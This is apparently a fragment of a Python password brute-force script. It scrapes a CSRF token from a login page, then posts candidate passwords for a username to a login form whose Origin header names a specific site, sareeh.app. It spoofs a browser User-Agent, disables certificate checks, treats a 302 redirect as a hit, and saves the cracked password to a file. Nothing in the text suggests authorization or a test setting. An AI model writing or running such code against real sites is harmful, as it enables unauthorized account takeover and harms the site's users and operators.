def get_token():
    global token
    try:
        s = requests.Session()
        resp = s.get(url, verify=False, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find('input', {'name': '_token'}) or soup.find('input', {'name': 'csrf_token'})
        if token_input:
            token = token_input.get('value')
            return token
    except Exception as e:
        logging.error(f"Error getting token: {e}")
    return None

def try_login(pwd, username):
    global found_password, token
    
    if found_password:
        return None
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': 'https://sadeem-sky3.sareeh.app',
        'Referer': url,
        'Connection': 'keep-alive',
    })
    
    payload = {'username': username, 'password': pwd}
    if token:
        payload['_token'] = token
    
    try:
        response = session.post(url, data=payload, verify=False, timeout=2, allow_redirects=False)
        
        if response.status_code == 302:
            with found_lock:
                if not found_password:
                    found_password = pwd
                    with open("found_password.txt", "w") as f:
                        f.write(pwd)
            return pwd
        return None
    except:
        return None

